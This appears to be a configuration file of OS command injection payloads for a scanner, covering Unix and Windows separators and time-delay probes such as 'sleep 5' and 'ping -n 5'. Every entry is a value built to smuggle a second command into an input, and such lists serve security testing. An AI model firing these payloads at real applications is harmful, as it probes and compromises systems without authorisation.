[DEFAULT]
payload = None
injection_type = None
delimiter = None

[basic_semicolon_injection]
payload = ;id
injection_type = unix
delimiter = ;

[and_and_injection]
payload = && whoami
injection_type = unix
delimiter = &&

[pipe_injection]
payload = | uname -a
injection_type = unix
delimiter = |

[windows_ampersand_injection]
payload = & dir
injection_type = windows
delimiter = &

[backtick_injection]
payload = `whoami`
injection_type = unix
delimiter = `
case_sensitive = no

[dollar_parentheses_injection]
payload = $(id)
injection_type = unix
delimiter = $()

[delay_unix_sleep_5]
payload = ; sleep 5
injection_type = unix
delimiter = ;

[delay_unix_pipe_sleep_5]
payload = | sleep 5
injection_type = unix
delimiter = |

[delay_unix_backtick_sleep]
payload = `sleep 5`
injection_type = unix
delimiter = `

[delay_unix_dollar_paren_sleep]
payload = $(sleep 5)
injection_type = unix
delimiter = $()

[delay_windows_ping]
payload = & ping -n 5 127.0.0.1 > nul
injection_type = windows
delimiter = &

[delay_windows_timeout]
payload = & timeout /T 5 /NOBREAK > nul
injection_type = windows
delimiter = &
